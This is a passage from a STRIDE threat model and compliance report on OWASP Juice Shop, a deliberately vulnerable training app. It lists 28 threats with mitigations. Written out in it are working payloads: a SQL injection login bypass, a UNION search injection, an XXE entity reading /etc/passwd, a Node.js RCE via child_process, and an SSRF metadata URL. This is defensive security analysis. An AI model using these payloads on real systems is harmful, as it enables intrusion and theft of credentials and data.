| [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | Rate limiting on all endpoints | ❌ FAIL | POST /rest/user/login has no rate limit | [T-017](#t-017) |
| [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) | HSTS header | ❌ FAIL | No HSTS header set in server.ts | [T-014](#t-014) |
| [SC-001](https://owasp.org/www-project-dependency-check/) | SCA in CI pipeline | ❌ FAIL | No npm audit or Snyk blocking step in CI | [T-026](#t-026) |
| [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | Security event logging | ❌ FAIL | No auth failure or authz violation events logged in lib/logger.ts | [T-025](#t-025) |
| [DP-003](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | Sensitive data not in URLs | ❌ FAIL | Passwords passed in GET query params in routes/changePassword.ts:13 | [T-016](#t-016) |
| [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) | Global CSP header | ⚠️ PARTIAL | CSP applied to /profile only with unsafe-eval; not global | [T-007](#t-007) |
| [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) | RBAC deny-by-default | ⚠️ PARTIAL | isAuthorized() used on many routes but PUT /api/Products/:id commented out | [T-012](#t-012) |
| [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | Secure file upload | ⚠️ PARTIAL | Size limit present (200KB) but content-type validation is by extension only; zip path traversal possible | [T-019](#t-019) |
| [SC-002](https://owasp.org/www-project-dependency-check/) | Lockfile pinning | ⚠️ PARTIAL | package-lock.json not confirmed present; CI uses `npm install` | [T-026](#t-026) |
| [LM-002](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | Structured log format | ⚠️ PARTIAL | Morgan access logs are structured (combined); Winston uses simple() format | — |
| [EH-001](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) | No internal detail in errors | ⚠️ PARTIAL | Some routes pass raw error messages to next(); errorhandler may expose stack traces in dev | [T-025](#t-025) |
| [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) | Input validation allowlist | ⚠️ PARTIAL | Some sanitization via sanitize-html; no global input schema validation | [T-007](#t-007) |
| [IF-002](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) | Container non-root | ✅ PASS | Dockerfile:18 sets USER 65532; distroless image | — |
| [SC-004](https://owasp.org/www-project-cyclonedx/) | SBOM generation | ✅ PASS | cyclonedx-npm run in Docker build step | — |
| [SC-006](https://owasp.org/www-community/controls/Static_Code_Analysis) | SAST in CI | ✅ PASS | CodeQL enabled in .github/workflows/codeql-analysis.yml | — |
| [HN-001](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) | Disable X-Powered-By | ✅ PASS | `app.disable('x-powered-by')` in server.ts | — |

**Summary:** 25 requirements checked — ✅ 4 PASS · ❌ 13 FAIL · ⚠️ 8 PARTIAL


---

## 8. Threat Register

Threats to OWASP Juice Shop v19.2.1 are documented below. This threat model was produced using STRIDE analysis across 5 components, supplemented by OWASP Top 10 2021 coverage checks and requirements compliance findings.

**Risk methodology:** Risk = Likelihood × Impact. Likelihood considers exploitability, attack complexity, and required privileges. Impact considers confidentiality, integrity, and availability effects on the identified assets. Ratings: Critical, High, Medium, Low.

**Risk Distribution:** Critical: 6 · High: 10 · Medium: 8 · Low: 4 · **Total: 28**
**STRIDE Coverage:** Spoofing: 5 · Tampering: 6 · Repudiation: 2 · Information Disclosure: 7 · Denial of Service: 3 · Elevation of Privilege: 5

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|----------------|-----------|--------|------|-------------------|-------------|
| <a id="t-001"></a>[T-001](#t-001) | Auth Service | Spoofing | An attacker reads the RSA private key hardcoded in [lib/insecurity.ts:24](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24) from the public GitHub repository and uses it to sign arbitrary JWT tokens with any role (admin, accounting), gaining full system access without valid credentials. (CWE-321) Violated: [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | JWT signature verification present (RS256 with public key) but the private key is publicly accessible | [M-001](#m-001) |
| <a id="t-002"></a>[T-002](#t-002) | Auth Service | Tampering | An unauthenticated attacker submits `' OR 1=1--` as the email in POST /rest/user/login, exploiting the raw string interpolation in [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) to bypass authentication and receive an admin JWT token. (CWE-89) Violated: [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | MD5 password hash comparison present (ineffective against SQLi bypass) | [M-002](#m-002) |
| <a id="t-003"></a>[T-003](#t-003) | Database Layer | Information Disclosure | An attacker submits a UNION-based SQL injection payload via GET /rest/products/search?q= exploiting the raw query at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) to extract the entire Users table including email addresses, MD5 password hashes, and payment card data. (CWE-89) Violated: [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | Query length capped at 200 chars; insufficient to prevent injection | [M-002](#m-002) |
| <a id="t-004"></a>[T-004](#t-004) | Auth Service | Information Disclosure | After any database exposure (via T-003 or direct SQLite file access), all user passwords are stored as unsalted MD5 hashes ([models/user.ts:70](vscode://file/home/mrohr/juice-shop/models/user.ts:70)), enabling instant cracking via rainbow tables or GPU attack for common passwords. (CWE-916) Violated: [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | MD5 hash applied; no plain-text storage. Insufficient — MD5 is cryptographically broken for passwords | [M-003](#m-003) |
| <a id="t-005"></a>[T-005](#t-005) | REST API | Elevation of Privilege | An authenticated attacker sends a malicious `orderLinesData` payload to POST /b2b/v2/orders. The value is executed via `vm.runInContext('safeEval(orderLinesData)', sandbox)` at [routes/b2bOrder.ts:22](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:22). Node.js VM sandboxes are not security boundaries and can be escaped, enabling arbitrary OS command execution. (CWE-94) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | JWT authentication required; 2s timeout on vm execution | [M-004](#m-004) |
| <a id="t-006"></a>[T-006](#t-006) | File Handling | Information Disclosure | An attacker uploads an XML file to POST /file-upload containing an XXE payload with `SYSTEM "file:///etc/passwd"`. The libxmljs2 parser is called with `{ noent: true }` at [routes/fileUpload.ts:75](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:75), resolving external entities and returning file contents in the 410 error response. (CWE-611) Violated: [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | Executed inside vm.createContext with 2s timeout | [M-005](#m-005) |
| <a id="t-007"></a>[T-007](#t-007) | Angular SPA | Tampering | An attacker submits a stored XSS payload as a product review. The Angular SPA calls `sanitizer.bypassSecurityTrustHtml(review.message)` at [frontend/src/app/search-result/search-result.component.ts:132](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:132) and renders it via `[innerHTML]`, executing the script in every visiting user's browser, stealing session tokens from cookies/localStorage. (CWE-79) Violated: [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | sanitize-html used in some backend paths; bypassed in frontend | [M-006](#m-006) |
| <a id="t-008"></a>[T-008](#t-008) | Angular SPA | Information Disclosure | The Last Login IP component renders the `lastLoginIp` field from the decoded JWT payload directly as HTML via `sanitizer.bypassSecurityTrustHtml()` at [frontend/src/app/last-login-ip/last-login-ip.component.ts:39](vscode://file/home/mrohr/juice-shop/frontend/src/app/last-login-ip/last-login-ip.component.ts:39). An attacker who can set their last login IP (via T-001 forged token) can inject persistent XSS in the admin view. (CWE-79) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Angular security bypass explicit in code | [M-006](#m-006) |
| <a id="t-009"></a>[T-009](#t-009) | Auth Service | Information Disclosure | An authenticated attacker calls GET /rest/user/authentication-details (protected by isAuthorized() but accessible to any authenticated user) which returns all active session tokens stored in `authenticatedUsers.tokenMap`, enabling session hijacking of any currently logged-in user including admins. (CWE-200) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | JWT authentication required to access endpoint | [M-007](#m-007) |
| <a id="t-010"></a>[T-010](#t-010) | REST API | Information Disclosure | An authenticated attacker sets their profile image URL to an internal cloud metadata endpoint (e.g., `http://169.254.169.254/latest/meta-data/`) at POST /profile/image/url. The server fetches the URL server-side at [routes/profileImageUrlUpload.ts:27](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts:27) with no allowlist validation, enabling SSRF to internal services, cloud metadata, or localhost. (CWE-918) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | JWT authentication required; partial SSRF challenge detection regex | [M-008](#m-008) |
| <a id="t-011"></a>[T-011](#t-011) | REST API | Elevation of Privilege | An authenticated attacker calls GET /rest/basket/:id with another user's basket ID. The route handler at [routes/basket.ts:18](vscode://file/home/mrohr/juice-shop/routes/basket.ts:18) only logs an IDOR challenge solve but returns the basket contents regardless of ownership, exposing other users' pending orders and payment info. (CWE-639) Violated: [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | isAuthorized() middleware applied at route level | [M-009](#m-009) |
| <a id="t-012"></a>[T-012](#t-012) | REST API | Tampering | The `isAuthorized()` middleware for PUT /api/Products/:id is commented out at [server.ts:369](vscode://file/home/mrohr/juice-shop/server.ts:369), allowing unauthenticated attackers to modify any product's name, description, price, or image, defacing the store or setting arbitrary prices. (CWE-306) Violated: [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Sequelize ORM model validation present | [M-010](#m-010) |
| <a id="t-013"></a>[T-013](#t-013) | REST API | Information Disclosure | Wildcard CORS (`app.use(cors())`) at [server.ts:182](vscode://file/home/mrohr/juice-shop/server.ts:182) allows any origin to make credentialed cross-origin requests to all API endpoints, enabling a malicious website to silently call authenticated Juice Shop APIs on behalf of a logged-in victim and exfiltrate data. (CWE-942) Violated: [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | JWT auth required for most endpoints | [M-011](#m-011) |
| <a id="t-014"></a>[T-014](#t-014) | REST API | Information Disclosure | No HSTS header is set, and CSP is only applied to /profile with `unsafe-eval`. An attacker performing a MITM attack (e.g., on a shared network) can downgrade HTTPS to HTTP, intercept JWT tokens from cookies (not HttpOnly-flagged), and hijack sessions. (CWE-319) Violated: [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | helmet.noSniff(), frameguard() present; X-Powered-By disabled | [M-012](#m-012) |
| <a id="t-015"></a>[T-015](#t-015) | REST API | Elevation of Privilege | The POST /api/Users (registration) endpoint passes the full request body to the Sequelize model without field filtering. [server.ts:509](vscode://file/home/mrohr/juice-shop/server.ts:509) shows the resource.create handler allows setting `role` directly, enabling any user to self-register as admin. (CWE-915) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Partial challenge checks in verify.registerAdminChallenge() | [M-013](#m-013) |
| <a id="t-016"></a>[T-016](#t-016) | Auth Service | Information Disclosure | The change-password endpoint (GET /rest/user/change-password) accepts the current and new passwords as URL query parameters ([routes/changePassword.ts:13](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts:13)). Passwords appear in server access logs, browser history, and HTTP Referer headers. Current password is optional — omitting it bypasses the current-password check. (CWE-598) Violated: [DP-003](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | JWT authentication required | [M-014](#m-014) |
| <a id="t-017"></a>[T-017](#t-017) | Auth Service | Denial of Service | POST /rest/user/login has no rate limiting applied at [server.ts:594](vscode://file/home/mrohr/juice-shop/server.ts:594) (rate limit only applied to /rest/user/reset-password). An attacker can run an automated credential-stuffing or brute-force attack against any account without throttling. (CWE-307) Violated: [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Optional TOTP available; account lockout not implemented | [M-015](#m-015) |
| <a id="t-018"></a>[T-018](#t-018) | Auth Service | Spoofing | The OAuth2 authorization flow at /oauth2/authorization does not enforce PKCE or validate the `state` parameter against CSRF. An attacker can perform an OAuth CSRF attack to link a victim's account to the attacker's OAuth identity, then authenticate as the victim. (CWE-352) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Google validates redirect_uri | [M-016](#m-016) |
| <a id="t-019"></a>[T-019](#t-019) | File Handling | Tampering | The zip file upload handler at [routes/fileUpload.ts:36](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:36) extracts files and only checks that the resolved path `includes(path.resolve('.'))`. A zip-slip attack with a crafted `../` path entry can write files outside the intended uploads directory to any location writable by the process. (CWE-22) Violated: [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | path.resolve() used; `includes()` check present but insufficient | [M-017](#m-017) |
| <a id="t-020"></a>[T-020](#t-020) | File Handling | Information Disclosure | The logfile server at [routes/logfileServer.ts:10](vscode://file/home/mrohr/juice-shop/routes/logfileServer.ts:10) checks only that the filename does not contain `/`, but a filename like `..%2Fapp.js` after URL decoding could read files outside logs/. Similarly, GET /ftp exposes directory listings and sensitive files (incident-support.kdbx, acquisitions.md). (CWE-35) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Forward-slash check in filename; robots.txt disallows /ftp | [M-018](#m-018) |
| <a id="t-021"></a>[T-021](#t-021) | REST API | Information Disclosure | The /metrics endpoint at [server.ts:718](vscode://file/home/mrohr/juice-shop/server.ts:718), /api-docs Swagger UI, and /encryptionkeys/:file are all served without authentication. An attacker can retrieve Prometheus application metrics, full API documentation, and the RSA public key/premium key from these unauthenticated endpoints. (CWE-200) Violated: [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | None | [M-019](#m-019) |
| <a id="t-022"></a>[T-022](#t-022) | REST API | Denial of Service | The YAML upload handler at [routes/fileUpload.ts](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts) parses YAML with `yaml.load()` inside a vm sandbox with 2s timeout. A specially crafted YAML bomb (billion laughs attack via anchors) can exhaust Node.js memory/CPU for up to 2 seconds per request, enabling a sustained DoS with concurrent requests. (CWE-400) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | 200KB file size limit; 2s execution timeout | [M-020](#m-020) |
| <a id="t-023"></a>[T-023](#t-023) | Database Layer | Denial of Service | The `showProductReviews` endpoint uses `$where: 'this.product == ' + id` ([routes/showProductReviews.ts:36](vscode://file/home/mrohr/juice-shop/routes/showProductReviews.ts:36)). An attacker can inject a sleep function into this NoSQL operator to cause the NeDB query to block the event loop for up to 2 seconds. Combined with T-024 this enables query-level DoS. (CWE-400) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Global `sleep()` capped at 2000ms | [M-021](#m-021) |
| <a id="t-024"></a>[T-024](#t-024) | Database Layer | Tampering | The NeDB `$where` operator in `showProductReviews` ([routes/showProductReviews.ts:36](vscode://file/home/mrohr/juice-shop/routes/showProductReviews.ts:36)) and `trackOrder` ([routes/trackOrder.ts:20](vscode://file/home/mrohr/juice-shop/routes/trackOrder.ts:20)) evaluates attacker-controlled JavaScript strings against all documents. An attacker can inject `true` conditions to access all reviews/orders or `this.author.match(/admin/)` to target admin data. (CWE-943) | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | Challenge-disabled path uses Number() coercion | [M-021](#m-021) |
| <a id="t-025"></a>[T-025](#t-025) | REST API | Repudiation | Authentication failures, authorization denials, and privilege escalation attempts are not logged as discrete security events ([lib/logger.ts](vscode://file/home/mrohr/juice-shop/lib/logger.ts)). Morgan logs HTTP requests but not security semantics. An attacker can probe the system extensively without leaving attributable audit trail. (CWE-778) Violated: [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | Morgan HTTP access logs present | [M-022](#m-022) |
| <a id="t-026"></a>[T-026](#t-026) | CI/CD Pipeline | Tampering | `codeql-analysis.yml` pins `github/codeql-action/*` to mutable `@v3` tags. A supply chain attack compromising the `github/codeql-action` repository could push malicious code to v3, which would execute with full CI/CD privileges including access to GitHub secrets and build artifacts. Additionally, no `npm audit` step blocks builds on known vulnerable dependencies. (CWE-1357) Violated: [SC-001](https://owasp.org/www-project-dependency-check/), [SC-002](https://owasp.org/www-project-dependency-check/) | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | ci.yml actions are SHA-pinned; SBOM generated | [M-023](#m-023) |
| <a id="t-027"></a>[T-027](#t-027) | Angular SPA | Spoofing | The open redirect at GET /redirect?to= ([routes/redirect.ts:14](vscode://file/home/mrohr/juice-shop/routes/redirect.ts:14)) uses a denylist of known bad URLs rather than an allowlist. An attacker crafts a phishing URL that passes the allowlist check (e.g., via URL encoding tricks) and redirects victims to a malicious site after clicking a Juice Shop link. (CWE-601) | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | isRedirectAllowed() allowlist partially enforced | [M-024](#m-024) |
| <a id="t-028"></a>[T-028](#t-028) | REST API | Repudiation | The cookie-parser is initialized with a hardcoded secret (`'kekse'`) at [server.ts:289](vscode://file/home/mrohr/juice-shop/server.ts:289). Signed cookies can be forged once the secret is known (it is public in the repo), undermining the integrity of any cookie-based state or CSRF tokens. (CWE-321) | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | CSRF challenge detection present | [M-001](#m-001) |


---

## 9. Critical Findings

The following findings require immediate attention due to their critical or high risk rating. Each finding links to its recommended mitigation in the [Mitigation Register](#10-mitigation-register).

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-001](#t-001) — Hardcoded RSA Private Key Enables JWT Forgery

**Scenario:** Any person with read access to the GitHub repository can extract the 1024-bit RSA private key from [lib/insecurity.ts:24](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24) and use standard JWT libraries to sign tokens with any payload — including `role: "admin"` — bypassing all authentication and authorization controls.

**Current state:** The full PEM-encoded private key is a string literal in source code. The file is committed to a public repository. No key rotation mechanism exists.

**Violated Requirements:** [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secrets must be stored in a dedicated secret manager

→ **Mitigation:** [M-001 — Replace hardcoded secrets with environment-injected secrets](#m-001)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-002](#t-002) — SQL Injection in Login Query Enables Authentication Bypass

**Scenario:** POST /rest/user/login with `email: "' OR 1=1--"` exploits the raw string concatenation at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34), causing the query to return the first user (admin) without a valid password. The attacker receives a valid admin JWT token.

**Current state:** `models.sequelize.query(\`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}'\`)` — no parameterization. No rate limit on this endpoint.

**Violated Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries required

→ **Mitigation:** [M-002 — Parameterize all SQL queries](#m-002)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-003](#t-003) — SQL Injection in Search Enables Full Database Extraction

**Scenario:** GET /rest/products/search?q=x%27+UNION+SELECT... exploits [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) to extract all Users, Cards, and SecurityAnswers tables via UNION injection. Attacker obtains all user emails, MD5 password hashes, and PII.

**Current state:** `models.sequelize.query(\`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%'...\`)` — direct interpolation. Length cap of 200 chars is insufficient to prevent UNION attacks.

**Violated Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries required

→ **Mitigation:** [M-002 — Parameterize all SQL queries](#m-002)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-004](#t-004) — MD5 Password Hashing — Trivial Offline Cracking

**Scenario:** After any database exposure (T-003), all user passwords are stored as unsalted MD5 hashes ([models/user.ts:70](vscode://file/home/mrohr/juice-shop/models/user.ts:70)). Common passwords crack instantly via pre-computed rainbow tables. GPU-based attacks crack the entire dump in minutes.

**Current state:** `this.setDataValue('password', security.hash(clearTextPassword))` where `security.hash = (data) => crypto.createHash('md5').update(data).digest('hex')` — no salt, no iterations.

**Violated Requirements:** [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) — Secure password storage required

→ **Mitigation:** [M-003 — Replace MD5 with bcrypt or argon2](#m-003)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-005](#t-005) — RCE via vm.runInContext in B2B Order Endpoint

**Scenario:** An authenticated attacker sends `{"orderLinesData": "require('child_process').execSync('cat /etc/passwd').toString()"}` to POST /b2b/v2/orders. Node.js VM sandboxes are not security isolation boundaries and are trivially escaped to gain code execution on the host process.

**Current state:** `vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })` at [routes/b2bOrder.ts:22](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:22). JWT authentication required but any registered user qualifies.

→ **Mitigation:** [M-004 — Remove vm.runInContext evaluation of user input](#m-004)

---

### <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> [T-006](#t-006) — XXE via libxmljs2 with External Entities Enabled

**Scenario:** Uploading an XML file containing `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` to POST /file-upload causes [routes/fileUpload.ts:75](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:75) to resolve the external entity and include `/etc/passwd` contents in the 410 error response body.

